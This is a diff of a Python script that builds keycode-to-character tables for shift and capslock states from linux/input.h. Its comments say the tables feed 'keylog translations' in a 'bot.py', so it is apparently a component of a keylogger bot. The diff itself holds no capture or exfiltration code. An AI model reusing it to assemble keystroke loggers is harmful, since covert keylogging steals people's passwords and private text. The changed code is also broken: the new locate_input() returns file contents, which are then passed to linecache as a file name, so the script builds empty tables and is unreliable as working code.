@@ -1,3 +1,9 @@
+#!/usr/bin/env python
+# DYNAMICALLY FIND linux-input.h ADD CONDITION THAT LOOKS FOR KEYMAP, IF NONE, THEN BUILD
+
+# Builds the lists (maps) required by bot.py for keylog translations.
+# All key names and indexes from linux/input.h.
+from platform import release
 import linecache
 import fnmatch
 import re
@@ -5,10 +11,10 @@ import re
 
 keymap = []
 cap_keymap = []
-cap_shift_keymap = []
+cap_shift_keymap = []	# For the instance that both capslock and shift keys are depressed.
 shift_keymap = []
 
-special = ['RESERVED', 'ESC', 'BACKSPACE',  'CAPSLOCK', 'F1', 'F2', 'F3', 
+SPECIAL = ['RESERVED', 'ESC', 'BACKSPACE',  'CAPSLOCK', 'F1', 'F2', 'F3', 
 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'NUMLOCK', 'SCROLLLOCK', 'F11',
 'F12', 'SYSRQ', 'LINEFEED', 'UP', 'PAGEUP', 'LEFT', 'RIGHT', 'END', 'DOWN', 
 'PAGEDOWN', 'INSERT', 'DELETE', 'MACRO', 'MUTE', 'VOLUMEDOWN', 'VOLUMEUP', 
@@ -30,7 +36,9 @@ special = ['RESERVED', 'ESC', 'BACKSPACE',  'CAPSLOCK', 'F1', 'F2', 'F3',
 'BLUETOOTH', 'WLAN', 'UWB', 'UNKNOWN', 'VIDEO_NEXT', 'VIDEO_PREV', 
 'BRIGHTNESS_CYCLE', 'BRIGHTNESS_ZERO', 'DISPLAY_OFF', 'WIMAX', 'RFKILL']
 
-sym = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')','ENTER': '[ENTER]', 
+# Dictionary of lowercase letters, numbers, punctuation, and 
+# function keys for keymap listing.
+SYM = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')','ENTER': '[ENTER]', 
 'KPENTER': '[ENTER]', 'TAB': ' [TAB]	', 'RIGHTCTRL': '[CTRL]', 
 'LEFTCTRL': '[CTRL]', 'MINUS': '-', 'EQUAL': '=', 'LEFTBRACE': '[', 
 'RIGHTBRACE': ']', 'SEMICOLON': ';', 'APOSTROPHE': "'", 'GRAVE': '`', 
@@ -46,7 +54,9 @@ sym = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')','ENTER': '[ENTER]',
 'G': 'g', 'H': 'h', 'J': 'j', 'K': 'k', 'L': 'l', 'Z': 'z', 'X': 'x', 
 'C': 'c', 'V': 'v', 'B': 'b', 'N': 'n', 'M': 'm'}
 
-cap_sym = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]', 
+# Dictionary of numbers, punctuation, and 
+# function keys for cap_keymap listing.
+CAP_SYM = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]', 
 'KPENTER': '[ENTER]', 'TAB': ' [TAB]	', 'RIGHTCTRL': '[CTRL]', 
 'LEFTCTRL': '[CTRL]', 'MINUS': '-', 'EQUAL': '=', 'LEFTBRACE': '[', 
 'RIGHTBRACE': ']', 'SEMICOLON': ';', 'APOSTROPHE': "'",'GRAVE': '`', 
@@ -58,7 +68,9 @@ cap_sym = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]',
 'RIGHTMETA': 'COMMAND', 'LEFTSHIFT': '[SHIFT]', 'RIGHTSHIFT': '[SHIFT]', 
 'LEFTALT': '[ALT]'}
 
-cap_shift_sym = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]', 
+# Dictionary of lowercase letters, numbers, punctuation, and 
+# function keys for cap_shift_keymap listing.
+CAP_SHIFT_SYM = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]', 
 'KPENTER': '[ENTER]', 'TAB': ' [TAB]	', 'RIGHTCTRL': '[CTRL]', 
 'LEFTCTRL': '[CTRL]', 'MINUS': '_', 'EQUAL': '+', 'LEFTBRACE': '{', 
 'RIGHTBRACE': '}', 'SEMICOLON': ':', 'APOSTROPHE': '\\\"', 'GRAVE': '~', 
@@ -75,7 +87,9 @@ cap_shift_sym = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]',
 'G': 'g', 'H': 'h', 'J': 'j', 'K': 'k', 'L': 'l', 'Z': 'z', 'X': 'x', 
 'C': 'c', 'V': 'v', 'B': 'b', 'N': 'n', 'M': 'm'}
 
-shift_sym = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]', 
+# Dictionary of numbers, punctuation, and 
+# function keys for shift_keymap listing.
+SHIFT_SYM = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]', 
 'KPENTER': '[ENTER]', 'TAB': ' [TAB]	', 'RIGHTCTRL': '[CTRL]', 
 'LEFTCTRL': '[CTRL]', 'MINUS': '_', 'EQUAL': '+', 'LEFTBRACE': '{', 
 'RIGHTBRACE': '}', 'SEMICOLON': ':', 'APOSTROPHE': '\\\"', 'GRAVE': '~', 
@@ -88,14 +102,14 @@ shift_sym = {'KPLEFTPAREN': '(', 'KPRIGHTPAREN': ')', 'ENTER': '[ENTER]',
 'RIGHTSHIFT': '[SHIFT]', 'LEFTALT': '[ALT]', '1': '!', '2': '@', '3': '#', 
 '4': '$', '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')'}
 
-
+# keyed function shapes the specified keymap.
 def keyed(pyf, km, sym_list):
 	for s in km:
 		if s == km[len(km)-1]:
 			last = '"[' + s + ']"]'
 			pyf.write(last)
 			break
-		elif s in special:
+		elif s in SPECIAL:
 			btn = '"[' + s + ']",\n'
 			pyf.write(btn)
 		elif s in sym_list:
@@ -106,9 +120,20 @@ def keyed(pyf, km, sym_list):
 			pyf.write(entry)
 	return km
 
-# DYNAMICALLY FIND linux-input.h
+def locate_input():
+	kv = "/usr/src/linux-headers-" + release() + "/include/linux/input.h"
+	linux_input = open(kv, 'r')
+	f = linux_input.read()
+	linux_input.close()
+	# locate linux/input.h in system
+	# if uname.release is in line, open that line safely.
+	return f
+
+# Builds key list from linux/input.h. The KEY_ prefix is stripped. 
+# The index of each key matches its respective keycode.
 for i in range(183, 442):
-	linput = linecache.getline('linux-input.h', i).split()
+	key_input = locate_input()
+	linput = linecache.getline(key_input, i).split()
 	key = fnmatch.filter(linput, 'KEY*')
 	try:
 		key = re.sub(r'KEY_', "", key[0])
@@ -119,18 +144,27 @@ for i in range(183, 442):
 	except:
 		continue
 
-f = open("keymap.py", "w")
+def main():
+	# Creates keymap.py file to write maps to.
+	f = open("keymap.py", "w")
 
-f.write("keys = [\n")  					# Create keymap (unmodified).
-keyed(f, keymap, sym)
+	# Builds character keymap.
+	f.write("keys = [\n")
+	keyed(f, keymap, SYM)
 
-f.write("\n\ncap_keys = [\n") 			# Create capslock keymap.
-keyed(f, cap_keymap, cap_sym)
+	# Builds capslock keymap.
+	f.write("\n\ncap_keys = [\n")
+	keyed(f, cap_keymap, CAP_SYM)
 
-f.write("\n\ncap_shift_keys = [\n")		# Create cap/shift keymap.
-keyed(f, cap_shift_keymap, cap_shift_sym)
+	# Builds capslock/shift combination keymap.
+	f.write("\n\ncap_shift_keys = [\n")
+	keyed(f, cap_shift_keymap, CAP_SHIFT_SYM)
 
-f.write("\n\nshift_keys = [\n")			# Create shift keymap.
-keyed(f, shift_keymap, shift_sym)
+	# Builds shift keymap.
+	f.write("\n\nshift_keys = [\n")
+	keyed(f, shift_keymap, SHIFT_SYM)
 
-f.close()
+	f.close()
+
+if __name__ == '__main__':
+	main()
